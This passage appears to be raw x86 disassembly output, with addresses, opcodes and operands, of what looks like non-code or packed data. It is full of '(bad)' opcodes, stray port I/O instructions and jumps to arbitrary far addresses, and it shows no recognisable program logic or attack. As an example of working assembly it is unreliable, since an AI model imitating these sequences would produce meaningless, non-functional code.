  41f3db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3dc:	cmp    BYTE PTR [ecx+0x2b],ah
  41f3df:	or     bl,BYTE PTR [ecx+0x50]
  41f3e2:	clc    
  41f3e3:	mov    ebx,0x219f02a5
  41f3e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3e9:	jle    0x41f39c
  41f3eb:	js     0x41f3a2
  41f3ed:	mov    eax,ds:0x68e013fe
  41f3f2:	out    0xba,eax
  41f3f4:	das    
  41f3f5:	les    esp,FWORD PTR [ebx+0x62]
  41f3f8:	pop    esp
  41f3f9:	inc    esp
  41f3fa:	mov    dh,0x30
  41f3fc:	ds jg  0x41f475
  41f3ff:	sbb    ah,BYTE PTR [edi-0x48566c06]
  41f405:	jge    0x41f47a
  41f407:	stc    
  41f408:	ja     0x41f41b
  41f40a:	or     eax,0xe0bffbe
  41f40f:	push   eax
	...
  41f418:	add    BYTE PTR [eax],al
  41f41a:	add    BYTE PTR [esi],dh
  41f41c:	arpl   WORD PTR [eax-0x10],bp
  41f41f:	jge    0x41f41c
  41f421:	mov    esi,0x8c7853e7
  41f426:	daa    
  41f427:	inc    esp
  41f428:	outs   dx,BYTE PTR ds:[esi]
  41f429:	(bad)
  41f42c:	xchg   ebp,eax
  41f42d:	add    DWORD PTR [eax],eax
  41f42f:	lods   eax,DWORD PTR ds:[esi]
  41f430:	add    BYTE PTR [eax],al
  41f432:	add    ch,bh
  41f434:	mov    eax,ss
  41f436:	sub    al,0xf9
  41f438:	or     ecx,DWORD PTR [ecx+0x7f]
  41f43b:	adc    eax,0xeeb8dc4b
  41f440:	stos   BYTE PTR es:[edi],al
  41f441:	xchg   ebx,eax
  41f442:	xchg   edx,eax
  41f443:	inc    eax
  41f444:	(bad)  
  41f445:	sbb    ah,ah
  41f447:	or     BYTE PTR [edi],bh
  41f449:	(bad)  
  41f44a:	xor    DWORD PTR [ecx+0x17],esp
  41f44d:	(bad)  
  41f44e:	psubd  mm6,QWORD PTR [ecx-0x776ef5fa]
  41f455:	enter  0xbb61,0x8
  41f459:	push   edi
  41f45a:	fistp  WORD PTR [ebp-0x29]
  41f45d:	adc    cl,BYTE PTR [esp+edx*8]
  41f460:	fistp  DWORD PTR [ebp+0x11]
  41f463:	cdq    
  41f464:	pop    es
  41f465:	inc    ebp
  41f466:	rcr    BYTE PTR [eax],cl
  41f468:	mul    cl
  41f46a:	mov    WORD PTR [esi+0x1b],fs
  41f46d:	fsub   DWORD PTR [eax-0x42acb1a2]
  41f473:	add    cl,cl
  41f475:	sub    DWORD PTR [edi-0x1ce64ee],ecx
  41f47b:	test   al,0x1b
  41f47d:	mov    ebp,0xd0a6c765
  41f482:	je     0x41f48d
  41f484:	arpl   WORD PTR [esi+eiz*4+0x4b0247a7],di
  41f48b:	clc    
  41f48c:	imul   eax,DWORD PTR [ecx+0x1e],0x85ba4c49
  41f493:	xor    ebx,edi
  41f495:	ins    BYTE PTR es:[edi],dx
  41f496:	lods   al,BYTE PTR ds:[esi]
  41f497:	pop    edx
  41f498:	pop    ebx
  41f499:	fs add eax,0x4d4cef8f
  41f49f:	shl    esi,0x22
  41f4a2:	mov    eax,0x2280f09e
  41f4a7:	add    al,0x8b
  41f4a9:	xor    DWORD PTR [edi-0x6f],ebx
  41f4ac:	out    0xbf,eax
  41f4ae:	sub    al,0x32
  41f4b0:	mov    ds:0x1bcc7a98,al
  41f4b5:	xor    DWORD PTR [ebx-0xf4eca9],ebx
  41f4bb:	add    ebp,edx
  41f4bd:	cmp    BYTE PTR [ecx+0x64415851],al
  41f4c3:	pop    es
  41f4c4:	aam    0x6f
  41f4c6:	jp     0x41f511
  41f4c8:	pop    ds
  41f4c9:	or     eax,ebx
  41f4cb:	popf   
  41f4cc:	and    al,0x4c
  41f4ce:	int    0x31
  41f4d0:	retf   
  41f4d1:	xor    al,0xf6
  41f4d3:	add    al,0x9a
  41f4d5:	in     al,0x73
  41f4d7:	jo     0x41f515
  41f4d9:	pop    esi
  41f4da:	inc    esi
  41f4db:	mov    ebx,0xaa0a82ff
	...
  41f4e8:	add    BYTE PTR [eax],al
  41f4ea:	add    BYTE PTR [edi],ah
  41f4ec:	push   ecx
  41f4ed:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41f4f7:	sbb    eax,0xbe2b05ad
  41f4fc:	mov    ds:0xad0001,al
  41f501:	add    BYTE PTR [eax],al
  41f503:	pushf  
  41f504:	(bad)  
  41f505:	repnz sar BYTE PTR [ebp+edx*8+0x440096bd],cl
  41f50d:	jmp    0xb407:0x15c3ecc1
  41f514:	xor    al,0xf9
  41f516:	div    DWORD PTR [edi]
  41f518:	fsubr  DWORD PTR [ecx+ebx*2+0x1558a01]
  41f51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f520:	jne    0x41f4d9
  41f522:	jae    0x41f4e4
  41f524:	mov    al,ds:0x7afbc46e
  41f529:	sti    
  41f52a:	mov    WORD PTR [ecx+0x79],?
  41f52d:	add    dh,BYTE PTR [eax+0x5b]
  41f530:	ins    DWORD PTR es:[edi],dx
  41f531:	jo     0x41f544
  41f533:	icebp  
  41f534:	rcl    DWORD PTR [ebp-0xb152146],1
  41f53a:	outs   dx,BYTE PTR ds:[esi]
  41f53b:	mov    cl,0x97
  41f53d:	fdivr  DWORD PTR [eax-0x1135169a]
  41f543:	jp     0x41f4c7
  41f545:	mov    DWORD PTR [edi+ecx*4+0x7d],esp
  41f549:	loop   0x41f56f
  41f54b:	mov    edi,0xaabd14c9
  41f550:	test   ecx,ecx
  41f552:	(bad)  
  41f553:	aas    
  41f554:	add    ebx,DWORD PTR [ebp-0x9]
  41f557:	mov    ecx,0xbc270271
  41f55c:	add    dh,dh
  41f55e:	popa   
  41f55f:	inc    ebx
  41f560:	xchg   edx,eax
  41f561:	test   eax,0xbc433023
  41f566:	sbb    bh,BYTE PTR [edx+0x285126f5]
  41f56c:	sub    DWORD PTR [esi+eax*1],edx
  41f56f:	jb     0x41f519
  41f571:	xor    DWORD PTR [edi*1-0x70a2e1dd],esi
  41f578:	(bad)  
  41f579:	push   edx
  41f57a:	(bad)  
  41f57b:	mov    ds:0x73870c0,al
  41f580:	or     BYTE PTR [eax+0x3f],al
  41f583:	outs   dx,BYTE PTR ds:[esi]
  41f584:	pushf  
  41f585:	dec    ebp
  41f586:	popf   
  41f587:	mov    ah,0xf0
  41f589:	ret    
  41f58a:	stos   BYTE PTR es:[edi],al
  41f58b:	mov    cl,0xa5
  41f58d:	ficom  WORD PTR [edx+0x1e]
  41f590:	pop    ds
  41f591:	shl    DWORD PTR [edx],0xf0
  41f594:	dec    ebp
  41f595:	jns    0x41f522
  41f597:	scas   al,BYTE PTR es:[edi]
  41f598:	cmc    
  41f599:	out    dx,al
  41f59a:	sub    eax,0x428eaa61
  41f59f:	iret   
  41f5a0:	daa    
  41f5a1:	or     BYTE PTR [ebp+0x67],ch
  41f5a4:	mov    ah,0xdf
  41f5a6:	mov    ebx,0x4c06238b
  41f5ab:	add    al,0xff
  41f5ad:	jg     0x41f59b
  41f5af:	push   eax
	...
  41f5b8:	add    BYTE PTR [eax],al
  41f5ba:	add    BYTE PTR [edi],ah
  41f5bc:	ss lahf 
  41f5be:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f5c4:	and    eax,0x1789075b
  41f5c9:	jecxz  0x41f621
  41f5cb:	imul   esp,DWORD PTR [ebx+0xad0001],0x0
  41f5d2:	add    BYTE PTR [edi+0x6153859a],dh
  41f5d8:	add    ebx,DWORD PTR [ebp-0x2d]
  41f5db:	and    DWORD PTR [edx-0x5e74d0b],ebp
  41f5e1:	dec    ebp
  41f5e2:	sbb    al,0x99
  41f5e4:	xchg   edi,eax
  41f5e5:	xor    al,0xdb
  41f5e7:	push   esp
  41f5e8:	mov    ch,0x2
  41f5ea:	jns    0x41f577
  41f5ec:	xor    dh,cl
  41f5ee:	lahf   
  41f5ef:	jmp    0x27eb:0xc5decbb1
  41f5f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5f7:	jle    0x41f5e5
  41f5f9:	add    ah,al
  41f5fb:	xchg   edi,eax
  41f5fc:	test   eax,0xac71e718
  41f601:	add    DWORD PTR [ebp+0x7c],ebp
  41f604:	dec    eax
  41f605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f606:	xchg   edx,eax
  41f607:	pusha  
  41f608:	inc    ebp
  41f609:	or     al,0x86
  41f60b:	jmp    0xfc3ba0ee
  41f610:	call   0x61782b4d
  41f615:	push   edx
  41f616:	jge    0x41f617
  41f618:	jg     0x41f5a3
  41f61a:	mov    eax,DWORD PTR [ecx+0xb]
  41f61d:	out    0x31,eax
  41f61f:	inc    esi
  41f620:	pop    edi
  41f621:	mov    DWORD PTR [ebx],esp
  41f623:	mov    ah,0xf0
  41f625:	shl    edi,1
  41f627:	dec    eax
  41f628:	mov    ecx,0xf24f9e31
  41f62d:	xor    DWORD PTR ds:0x14d93127,edi
  41f633:	cmp    esi,ebp
  41f635:	push   0x55
  41f637:	push   esi
  41f638:	aad    0x76
  41f63a:	pop    sp
  41f63c:	enter  0xbe51,0xc9
  41f640:	sbb    BYTE PTR [eax],ah
  41f642:	int3   
  41f643:	and    BYTE PTR cs:[edi-0x78],bl
  41f647:	mov    eax,0xa0c5eaf8
  41f64c:	sbb    al,0x3d
  41f64e:	or     esi,edx
  41f650:	call   0x668cfe87
  41f655:	or     al,0x8c
  41f657:	shr    dh,0xc8
  41f65a:	inc    ebx
  41f65b:	loop   0x41f600
  41f65d:	test   al,0x6d
  41f65f:	add    DWORD PTR [edi+0x10],eax
  41f662:	lahf   
  41f663:	popf   
  41f664:	std    
  41f665:	mov    ds:0x69a97326,eax
  41f66a:	or     BYTE PTR [edi],al
  41f66c:	sub    DWORD PTR [esi+0x3333dd2e],edx
  41f672:	pop    ebp
  41f673:	mov    bh,0x60
  41f675:	stos   DWORD PTR es:[edi],eax
  41f676:	adc    BYTE PTR [eax],0xea
  41f679:	addr16 dec ebp
  41f67b:	add    eax,0x942d5a48
	...
  41f688:	add    BYTE PTR [eax],al
  41f68a:	add    BYTE PTR [edi],dh
  41f68c:	(bad)  
  41f68d:	out    0xc2,eax
  41f68f:	mul    ebx
  41f691:	aaa    
  41f692:	cmc    
  41f693:	xchg   ecx,eax
  41f694:	call   0xfe65:0x7419eef4
  41f69b:	sbb    BYTE PTR [ecx+eax*1+0xad00],ah
  41f6a2:	add    BYTE PTR [eax+ebx*8-0x23b17030],bh
  41f6a9:	sbb    edi,DWORD PTR [ecx]
  41f6ab:	imul   DWORD PTR [ebp-0x664d37c9]
  41f6b1:	jbe    0x41f69a
  41f6b3:	lods   al,BYTE PTR ds:[esi]
  41f6b4:	sahf   
  41f6b5:	push   ebx
  41f6b6:	lea    ebp,[ecx-0x622e6c96]
  41f6bc:	xlat   BYTE PTR ds:[ebx]
  41f6bd:	dec    edx
  41f6be:	cmc    
  41f6bf:	xor    DWORD PTR [esi+0x2f],edx
  41f6c2:	mov    cl,0xc
  41f6c4:	and    esi,DWORD PTR [esi-0x61618c07]
  41f6ca:	mov    BYTE PTR [ebp-0x72],dl
  41f6cd:	jnp    0x41f740
  41f6cf:	out    dx,al
  41f6d0:	inc    esi
  41f6d1:	push   es
  41f6d2:	dec    ecx
  41f6d3:	mov    bl,0x79
  41f6d5:	add    DWORD PTR [ebx],0xffffffa4
  41f6d8:	gs leave 
  41f6da:	and    eax,0xd3461e5d
  41f6df:	ins    BYTE PTR es:[edi],dx
  41f6e0:	push   ds
  41f6e1:	jmp    0x41f733
  41f6e3:	or     ebp,edx
  41f6e5:	jns    0x41f751
  41f6e7:	or     edx,DWORD PTR [ebx+0x6269c843]
  41f6ed:	mov    dh,0xa5
  41f6ef:	inc    ebp
  41f6f0:	in     eax,dx
  41f6f1:	mov    esi,0x54a301c8
  41f6f6:	mov    ecx,0x49e68b72
  41f6fb:	jno    0x41f6eb
  41f6fd:	push   esi
  41f6fe:	mov    edx,ebx
  41f700:	mov    bl,0xb5
  41f702:	mov    ebp,0xb32c34b8
  41f707:	icebp  
  41f708:	mov    al,0x45
  41f70a:	imul   edi,ebp,0xd466f621
  41f710:	(bad)  
  41f711:	(bad)  
  41f712:	nop    DWORD PTR [ecx+0x458cce83]
  41f719:	out    dx,eax
  41f71a:	jp     0x41f6df
  41f71c:	pop    ecx
  41f71d:	cli    
  41f71e:	mov    DWORD PTR [edx+edi*4],esi
  41f721:	loop   0x41f74b
  41f723:	test   BYTE PTR ds:0x5842d4c5,cl
  41f729:	push   ecx
  41f72a:	mov    ch,0x73
  41f72c:	pop    edx
  41f72d:	mov    ch,0x7e
  41f72f:	imul   esp,DWORD PTR [ebx+0x1152cde1],0x81c10437
  41f739:	add    DWORD PTR [esp+edx*8-0x160f5b2b],edx
  41f740:	jecxz  0x41f77c
  41f742:	es mov ecx,0xceec6c77
  41f748:	inc    ebp
  41f749:	das    
  41f74a:	jae    0x41f77b
  41f74c:	lds    edi,FWORD PTR [eax]
  41f74e:	enter  0x35,0x0
	...
  41f75a:	add    BYTE PTR [esi],dl
  41f75c:	aad    0xdf
  41f75e:	out    dx,eax
  41f75f:	fucomip st,st(7)
  41f761:	ss std 
  41f763:	cmp    BYTE PTR [esi+0x45515f3a],al
  41f769:	repnz call 0xad:0x1a4c5
  41f771:	add    BYTE PTR [eax],al
  41f773:	cmp    eax,0x4ceab18f
  41f778:	leave  
  41f779:	rcl    DWORD PTR [ebx+0x52],0xcf
  41f77d:	mov    edi,0x4b28485c
  41f782:	mov    bl,BYTE PTR [ebx]
  41f784:	popa   
  41f785:	stos   BYTE PTR es:[edi],al
  41f786:	sbb    al,0x28
  41f788:	or     al,0xce
  41f78a:	aaa    
  41f78b:	(bad)  
  41f78c:	fbstp  TBYTE PTR [edi]
  41f78e:	js     0x41f75f
  41f790:	xchg   esi,eax
  41f791:	mov    eax,ds:0x8c3f62ed
  41f796:	aaa    
  41f797:	mov    edx,0x6b90f5e
  41f79c:	cld    
  41f79d:	cmc    
  41f79e:	and    al,0x41
  41f7a0:	je     0x41f7e4
  41f7a2:	jae    0x41f7e5
  41f7a4:	sub    al,0x11
  41f7a6:	scas   eax,DWORD PTR es:[edi]
  41f7a7:	adc    DWORD PTR ds:0x2fcf97dd,0xa9d8aae7
  41f7b1:	pop    ds
  41f7b2:	loop   0x41f7b0
  41f7b4:	dec    edx
  41f7b5:	push   ds
  41f7b6:	hlt    
  41f7b7:	dec    edx
  41f7b8:	(bad)  
  41f7ba:	ins    BYTE PTR es:[edi],dx
  41f7bb:	jp     0x41f83a
  41f7bd:	jmp    0x1ad92c11
  41f7c2:	gs js  0x41f826
  41f7c5:	ds ja  0x41f7cb
  41f7c8:	(bad)  
  41f7c9:	retf   
  41f7ca:	push   ecx
  41f7cb:	hlt    
  41f7cc:	cld    
  41f7cd:	jne    0x41f7d3
  41f7cf:	dec    esi
  41f7d0:	rol    BYTE PTR [ecx-0x43],1
  41f7d3:	not    DWORD PTR [ecx+0x416af919]
  41f7d9:	ins    BYTE PTR es:[edi],dx
  41f7da:	lea    ebx,[esi+0x449ba4b9]
  41f7e0:	add    al,0x16
  41f7e2:	mov    ah,0xb9
  41f7e4:	int3   
  41f7e5:	(bad)  
  41f7e6:	call   0x10a04e7b
  41f7eb:	out    dx,eax
  41f7ec:	sbb    ebx,ebp
  41f7ee:	mov    WORD PTR [edi-0x145562bd],gs
  41f7f4:	int3   
  41f7f5:	inc    ebx
  41f7f6:	sar    edx,0xc7
  41f7f9:	sub    BYTE PTR [ebx],ah
  41f7fb:	dec    esp
  41f7fc:	pop    edx
  41f7fd:	rcl    BYTE PTR [eax],cl
  41f7ff:	mov    ecx,0x2e2ed45b
  41f804:	fist   WORD PTR [ebp+0x9]
  41f807:	xchg   BYTE PTR [edi-0x371b05fa],bh
  41f80d:	lea    esi,[eax+0x15]
  41f810:	dec    esi
  41f811:	xor    al,0x62
  41f813:	shr    DWORD PTR [ebx-0x48],cl
  41f816:	xchg   esp,eax
  41f817:	cmc    
  41f818:	das    
  41f819:	sahf   
  41f81a:	pop    es
  41f81b:	pop    ss
  41f81c:	and    BYTE PTR ds:0xe4c1,ch
	...
  41f82a:	add    BYTE PTR [esi+0x76],ch
  41f82d:	in     al,0xca
  41f82f:	cld    
  41f830:	fisubr DWORD PTR [esi-0xa]
  41f833:	sbb    BYTE PTR [edx-0x77bf6879],dl
  41f839:	sahf   
  41f83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f83b:	jb     0x41f7e2
  41f83d:	add    DWORD PTR [eax],eax
  41f83f:	lods   eax,DWORD PTR ds:[esi]
  41f840:	add    BYTE PTR [eax],al
  41f842:	add    BYTE PTR [ebp+0x62],ah
  41f845:	sub    eax,0xf80ebe35
  41f84a:	jae    0x41f812
  41f84c:	pop    es
  41f84d:	mov    ds:0xc8c70336,eax
  41f852:	jp     0x41f80b
  41f854:	dec    esp
  41f855:	lahf   
  41f856:	mov    eax,ds:0x9b9f326f
  41f85b:	push   es
  41f85c:	sbb    BYTE PTR ds:0x376ba284,al
  41f862:	daa    
  41f863:	(bad)  
  41f864:	call   0xd998de5f
  41f869:	mov    ds:0x303a37f8,al
  41f86e:	inc    ecx
  41f86f:	das    
  41f870:	jge    0x41f823
  41f872:	faddp  st(0),st
  41f874:	ret    
  41f875:	dec    ebp
  41f876:	jne    0x41f8cc
  41f878:	or     al,0x34
  41f87a:	fwait
  41f87b:	cdq    
  41f87c:	gs or  eax,0x380b11ca
  41f882:	aad    0x5
  41f884:	sub    eax,0x7797ce2a
  41f889:	sbb    eax,0x85e1fe4c
  41f88e:	push   eax
  41f88f:	bound  ebx,QWORD PTR [ebx-0x87428f0]
  41f895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f896:	inc    ecx
  41f897:	pop    ebx
  41f898:	sbb    BYTE PTR [eax+0x73],0xaa
  41f89c:	dec    esi
  41f89d:	dec    ebp
  41f89e:	push   ss
  41f89f:	sub    ebp,ebx
  41f8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8a2:	push   ecx
  41f8a3:	xchg   esi,eax
  41f8a4:	test   eax,0x342f2836
  41f8a9:	push   ebp
  41f8aa:	push   ds
  41f8ab:	ror    BYTE PTR [ebx+0x64],cl
  41f8ae:	add    DWORD PTR [eax+ebx*4+0x4dc99288],edi
  41f8b5:	mov    ds:0xe22a5ebc,eax
  41f8ba:	sbb    eax,0x71392bce
  41f8bf:	inc    ecx
  41f8c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8c1:	inc    ebx
  41f8c2:	cs pop edx
  41f8c4:	mov    dh,0xb8
  41f8c6:	mov    edi,edi
  41f8c8:	dec    eax
  41f8c9:	jo     0x41f877
  41f8cb:	push   es
  41f8cc:	jns    0x41f8a7
  41f8ce:	das    
  41f8cf:	mov    ah,0x77
  41f8d1:	ss aam 0xf6
  41f8d4:	lock add ch,al
  41f8d7:	out    dx,al
  41f8d8:	xchg   BYTE PTR [edx+0x9],bh
  41f8db:	pop    ebp
  41f8dc:	jae    0x41f8c1
  41f8de:	push   esi
  41f8df:	jne    0x41f865
  41f8e1:	mov    ebx,0x15959ef8
  41f8e6:	stc    
  41f8e7:	nop
  41f8e8:	mov    ?,WORD PTR [ebx-0x37]
  41f8eb:	adc    eax,DWORD PTR [eax*2+0x9eae]
	...
  41f8fa:	add    BYTE PTR [edx],bh
  41f8fc:	push   edx
  41f8fd:	les    ecx,FWORD PTR [edi]
  41f8ff:	in     al,dx
  41f900:	lahf   
  41f901:	sti    
  41f902:	ja     0x41f8fa
  41f904:	rcl    DWORD PTR [eax-0x3a241d2d],1
  41f90a:	(bad)  
  41f90b:	pop    ds
  41f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90d:	add    DWORD PTR [eax],eax
  41f90f:	lods   eax,DWORD PTR ds:[esi]
  41f910:	add    BYTE PTR [eax],al
  41f912:	add    BYTE PTR [esi],bl
  41f914:	adc    eax,0x62c6697
  41f919:	(bad)  
  41f91b:	data16 (bad) 
  41f91d:	out    0x20,al
  41f91f:	mov    ecx,0xf4e7a43d
  41f924:	sbb    al,0xed
  41f926:	jp     0x41f939
  41f928:	sub    ebp,esi
  41f92a:	ror    dl,0xf0
  41f92d:	push   ss
  41f92e:	lds    esi,FWORD PTR [edx-0x2a22e62e]
  41f934:	inc    ebp
  41f935:	lahf   
  41f936:	push   DWORD PTR [eax+0x10041951]
  41f93c:	adc    eax,0x2a6f0113
  41f941:	mov    edx,0xd11b0ea5
  41f946:	ror    BYTE PTR [ebp+0x64],1
  41f949:	inc    esp
  41f94a:	mov    edx,DWORD PTR [ecx]
  41f94c:	js     0x41f931
  41f94e:	enter  0xbbe4,0xae
  41f952:	mov    ebx,0x9cf8f841
  41f957:	hlt    
  41f958:	jmp    0xe07c1304
  41f95d:	mov    ah,0x6a
  41f95f:	fldenv [ecx+0x63]
  41f962:	in     eax,0x23
  41f964:	push   ebx
  41f965:	or     al,0x5f
  41f967:	add    al,0x93
  41f969:	retf   0xc247
  41f96c:	es fs rcr ebx,0x7b
  41f971:	mov    edi,0xd8aedff9
  41f976:	xchg   ebx,eax
  41f977:	out    0x2e,eax
  41f979:	nop    DWORD PTR [edx+0x235091ce]
  41f980:	jmp    0x2449e679
  41f985:	fild   DWORD PTR [ecx+0x35]
  41f988:	inc    edx
  41f989:	mov    bh,0xa5
  41f98b:	mov    cl,0x84
  41f98d:	jecxz  0x41f91b
  41f98f:	test   eax,0xa73be250
  41f994:	cmp    al,0x6c
  41f996:	jbe    0x41f934
  41f998:	pop    ecx
  41f999:	push   ds
  41f99a:	push   ss
  41f99b:	xor    eax,ecx
  41f99d:	es mov esp,0xe0404efa
  41f9a3:	pop    ss
  41f9a4:	aad    0x5a
  41f9a6:	jl     0x41f967
  41f9a8:	xor    esp,DWORD PTR [ebx]
  41f9aa:	adc    BYTE PTR [ebp-0xf0f1cfa],dh
  41f9b0:	pop    edi
  41f9b1:	mov    edi,0x698ff6d3
  41f9b6:	pop    ss
  41f9b7:	jbe    0x41f958
  41f9b9:	enter  0x722f,0x71
  41f9bd:	jp     0x41f9e7
  41f9bf:	repnz add BYTE PTR [eax],al
	...
  41f9ca:	add    BYTE PTR [ebx-0x4293427d],dl
  41f9d0:	jle    0x41f9a5
  41f9d2:	call   DWORD PTR [eax-0x20]
  41f9d5:	cli    
  41f9d6:	call   0xa6cc:0xc2679baf
  41f9dd:	add    DWORD PTR [eax],eax
  41f9df:	lods   eax,DWORD PTR ds:[esi]
  41f9e0:	add    BYTE PTR [eax],al
  41f9e2:	add    BYTE PTR [ecx+0x5924f781],ch
  41f9e8:	pop    ebx
  41f9e9:	push   esp
  41f9eb:	sub    DWORD PTR [edi+esi*1-0x15],ebx
  41f9ef:	push   DWORD PTR [edx+0xebf0a18]
  41f9f5:	sub    eax,0x11d5832e
  41f9fa:	stos   DWORD PTR es:[edi],eax
  41f9fb:	out    0x6,al
  41f9fd:	ss ds dec edi
  41fa00:	jle    0x41fa1b
  41fa02:	jns    0x41f9e0
  41fa04:	fs mov dh,0x87
  41fa07:	(bad)  
  41fa09:	push   ss
  41fa0a:	ja     0x41fa45
  41fa0c:	xor    BYTE PTR [ebp+0x71],ch
  41fa0f:	jecxz  0x41fa75
  41fa11:	sub    DWORD PTR [esi-0x2a3505ee],edi
  41fa17:	inc    esi
  41fa18:	and    cl,BYTE PTR [edx]
  41fa1a:	addr16 push 0x175d304
  41fa20:	pop    edi
  41fa21:	pop    ds
  41fa22:	mov    edx,0xa7f8974
  41fa27:	dec    edi
  41fa28:	or     bl,ah
  41fa2a:	ins    DWORD PTR es:[edi],dx
  41fa2b:	mov    al,BYTE PTR [ebx-0x28]
  41fa2e:	(bad)  
  41fa30:	loopne 0x41fa39
  41fa32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa33:	dec    esi
  41fa34:	(bad)  
  41fa36:	xor    dh,cl
  41fa38:	add    DWORD PTR [ebx+edx*4+0x4cfdd5b5],0x46
  41fa40:	ficomp DWORD PTR [edi]
  41fa42:	out    0x68,al
  41fa44:	push   ecx
  41fa45:	pop    edi
  41fa46:	hlt    
  41fa47:	xchg   ecx,eax
  41fa48:	repnz cmp DWORD PTR [edi],0xc68ad623
  41fa4f:	popa   
  41fa50:	inc    esp
  41fa51:	xor    ebx,edx
  41fa53:	iret   
  41fa54:	dec    ebp
  41fa55:	and    BYTE PTR [esi+0x41c92bf1],al
  41fa5b:	mov    eax,DWORD PTR [edx]
  41fa5d:	nop
  41fa5e:	sub    BYTE PTR [edi-0x39428570],ch
  41fa64:	fisttp WORD PTR [edx+0x6]
  41fa67:	mov    ah,0x7a
  41fa69:	or     DWORD PTR fs:[esi+0x74b0fa9c],edx
  41fa70:	call   0x76bd380d
  41fa75:	pop    es
  41fa76:	shr    BYTE PTR [esi+esi*1-0x63],cl
  41fa7a:	mov    ds:0xe5e5a5a2,al
  41fa7f:	imul   esi,DWORD PTR [ebx+eax*8-0x75],0xffffffed
  41fa84:	popf   
  41fa85:	xlat   BYTE PTR ds:[ebx]
  41fa86:	cmp    al,0xc7
  41fa88:	mov    al,ds:0xede7126d
  41fa8d:	add    BYTE PTR [ebp+0xdf],bh
	...
  41fa9b:	(bad)  
  41fa9d:	test   eax,0xddffeef7
  41faa3:	and    al,0x1
  41faa5:	pop    ebp
  41faa6:	dec    edi
  41faa7:	xor    BYTE PTR [ebp-0x19],0x6d
  41faab:	jns    0x41fa54
  41faad:	add    DWORD PTR [eax],eax
  41faaf:	lods   eax,DWORD PTR ds:[esi]
  41fab0:	add    BYTE PTR [eax],al
  41fab2:	add    BYTE PTR [esi+0x33896d78],cl
  41fab8:	sbb    BYTE PTR [ecx],dh
  41faba:	(bad)  [edx+0x12]
  41fabd:	pop    edi
  41fabe:	sbb    BYTE PTR [ebp+0x42f251c1],ch
  41fac4:	mov    edx,0x77fa8820
  41fac9:	in     al,0x99
  41facb:	fistp  DWORD PTR [edi+0x4c]
  41face:	cmc    
  41facf:	jle    0x41fb0a
  41fad1:	push   0xa35da86b
  41fad6:	cmp    eax,0xb599427c
  41fadb:	(bad)  
  41fadc:	adc    al,0xad
  41fade:	sbb    bl,BYTE PTR [ebp-0x5b]
  41fae1:	pop    ebx
  41fae2:	ds test al,0xce
  41fae5:	mov    ch,0x31
  41fae7:	mov    ch,0xe9
  41fae9:	mov    ah,0x55
  41faeb:	cli    
  41faec:	hlt    
  41faed:	ret    
  41faee:	lock and DWORD PTR [esi+ebp*8],0xe70ed1bb
  41faf6:	fnsave [ebx+0x7b38e0]
  41fafc:	inc    ebp
  41fafd:	push   ecx
  41fafe:	cmp    ah,bl
  41fb00:	jbe    0x41fac7
  41fb02:	mov    ch,BYTE PTR [esi+eax*1-0x2702dfc7]
  41fb09:	cli    
  41fb0a:	mov    al,0x2e
  41fb0c:	and    al,0x15
  41fb0e:	inc    esi
  41fb0f:	rol    BYTE PTR [eax+0x5535d7b8],cl
  41fb15:	pop    ebp
  41fb16:	mov    esi,0x50e2815b
  41fb1b:	xchg   ecx,eax
  41fb1c:	push   0xe05a63ee
  41fb21:	mov    ds:0x15f3463d,eax
  41fb26:	inc    ebx
  41fb27:	mov    edi,0x1aa230dc
  41fb2c:	sub    ecx,DWORD PTR [ebx+0x44d1c075]
  41fb32:	pop    eax
  41fb33:	test   DWORD PTR ds:0x83075ead,0x8e483231
  41fb3d:	add    eax,0xddef2bc2
  41fb42:	add    eax,0xbb879832
  41fb47:	(bad)  
  41fb48:	sbb    edi,DWORD PTR [eax]
  41fb4a:	mov    gs,edx
  41fb4c:	lea    ecx,fs:[edi-0x10511398]
  41fb53:	jmp    0xe447:0xc9ca2610
  41fb5a:	adc    al,0xdd
  41fb5c:	cld    
  41fb5d:	lods   al,BYTE PTR ds:[esi]
  41fb5e:	(bad)  [eax+0x0]
	...
  41fb69:	add    BYTE PTR [eax],al
  41fb6b:	outs   dx,DWORD PTR ds:[esi]
  41fb6c:	mov    ds:0x7edd2ad4,al
  41fb71:	jmp    edi
  41fb73:	push   edx
  41fb74:	fcmovu st,st(5)
  41fb76:	in     eax,0x42
  41fb78:	std    
  41fb79:	or     DWORD PTR [edx+0x26],eax
  41fb7c:	test   al,0x1
  41fb7e:	add    BYTE PTR [ebp+0x1c000000],ch
  41fb84:	outs   dx,BYTE PTR ds:[esi]
  41fb85:	ret    
  41fb86:	push   ss
  41fb87:	mov    ds:0x6a4ef340,eax
  41fb8c:	mov    esp,0x3dd44d25
  41fb91:	dec    esp
  41fb92:	scas   al,BYTE PTR es:[edi]
  41fb93:	dec    ecx
  41fb94:	imul   ebp,DWORD PTR [ebx-0x17],0xffffff82
  41fb98:	pushf  
  41fb99:	mov    edx,0x113b54b5
  41fb9e:	dec    esi
  41fb9f:	ins    BYTE PTR es:[edi],dx
  41fba0:	and    al,0xf3
  41fba2:	push   esi
  41fba3:	add    BYTE PTR [di],bl
  41fba6:	mov    ch,0x18
  41fba8:	lea    ebp,[edi-0x43]
  41fbab:	rol    BYTE PTR [edi+0x2],1
  41fbae:	push   esi
  41fbaf:	or     al,0xf3
  41fbb1:	add    DWORD PTR [esp+edi*4],esp
  41fbb4:	div    dl
  41fbb6:	(bad)  
  41fbb7:	cld    
  41fbb8:	leave  
  41fbb9:	sbb    esi,DWORD PTR [esi]
  41fbbb:	cmp    BYTE PTR [ebp+0x19],dl
  41fbbe:	sbb    DWORD PTR [eax],esi
  41fbc0:	push   edx
  41fbc1:	adc    DWORD PTR [esp+eiz*8-0x39],edx
  41fbc5:	and    BYTE PTR [eax+ebx*1-0x7e],ch
